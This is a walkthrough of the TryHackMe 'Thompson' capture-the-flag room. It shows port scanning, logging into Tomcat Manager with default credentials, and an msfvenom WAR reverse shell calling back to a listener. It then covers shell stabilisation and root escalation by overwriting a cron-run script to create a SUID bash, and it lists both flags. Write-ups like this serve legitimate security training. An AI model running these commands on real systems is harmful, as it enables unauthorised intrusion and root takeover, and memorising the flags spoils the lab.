# CTF: Thompson (THM)

**Target IP:** `10.48.182.10` ($target)

## Metadata

- **CTF Name:** Thompson
    
- **Platform:** TryHackMe
    
- **Date:** 2026-03-24
    
- **Tools Used:** nmap, gobuster, msfvenom, netcat, python3, stty, rlwrap
    
- **Key Skills:** Web Enumeration, Tomcat Manager Exploitation, WAR Payload Deployment, Shell Stabilization, SUID Binary Creation, Cron Job Exploitation
    

## Reconnaissance

Initial identification of open ports and services using a multi-stage Nmap scan.

**Command:**

```
😎 amuzed@Kali (~/THM/Thompson)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

**Key Results:**

- **22/tcp:** ssh (OpenSSH 7.2p2 Ubuntu)
    
- **8009/tcp:** ajp13 (Apache Jserv Protocol v1.3)
    
- **8080/tcp:** http-proxy (Apache Tomcat 8.5.5)
    

## Foothold

### 1. Directory Enumeration

Using Gobuster to find the management interface on the Tomcat server.

**Command:**

```
😎 amuzed@Kali (~/THM/Thompson)
$ gobuster dir -u http://$target:8080 -w /usr/share/wordlists/dirb/big.txt
```

**Results:**

- `/docs` (Status: 302)
    
- `/examples` (Status: 302)
    
- `/manager` (Status: 302)
    

### 2. Authentication Bypass / Default Credentials

Navigating to `/manager/html` prompted for credentials. Clicking "Cancel" redirected to a 401 Unauthorized page that explicitly listed default configuration examples.

- **Discovered Credentials:** `tomcat:s3cret`
    

### 3. Exploitation (WAR Reverse Shell)

I generated a malicious Java WAR file to gain a reverse shell.

**Command:**

```
😎 amuzed@Kali (~/THM/Thompson)
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.230.58 LPORT=8008 -f war > shell.war
```

**Listener Setup:**

```
😎 amuzed@Kali (~/THM/Thompson)
$ rlwrap nc -nvlp 8008 
```

### 4. Shell Stabilization

After uploading the WAR file and triggering it via the browser, I stabilized the shell using Python and stty.

**Commands:**

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@ubuntu:/$ export TERM=xterm
# [Ctrl+Z to suspend]
😎 amuzed@Kali (~/THM/Thompson)
$ stty raw -echo; fg
```

## Privilege Escalation

### 1. Internal Enumeration

In the home directory of user `jack`, I found a script named `id.sh` and a text file `test.txt`.

**Command:**

```
tomcat@ubuntu:/$ cd home/jack
tomcat@ubuntu:/home/jack$ ls
id.sh  test.txt  user.txt
```

### 2. Exploiting Scheduled Task (Cron)

The `test.txt` file was being updated with `uid=0(root)` output, implying `id.sh` was running as a root cron job. I overrode the script to create a root SUID shell.

**Commands:**

```
tomcat@ubuntu:/home/jack$ echo '#!/bin/bash' > id.sh
tomcat@ubuntu:/home/jack$ echo 'cp /bin/bash /tmp/rootbash' >> id.sh
tomcat@ubuntu:/home/jack$ echo 'chmod +s /tmp/rootbash' >> id.sh
```

**Executing Root Shell:**

After waiting for the cron job to trigger:

```
tomcat@ubuntu:/home/jack$ /tmp/rootbash -p
rootbash-4.3# id
uid=1001(tomcat) gid=1001(tomcat) euid=0(root) egid=0(root) groups=0(root),1001(tomcat)
```

## Flags

- **User Flag:** `39400c90bc683a41a8935e4719f181bf`
    
- **Root Flag:** `d89d5391984c0450a95497153ae7ca3a`
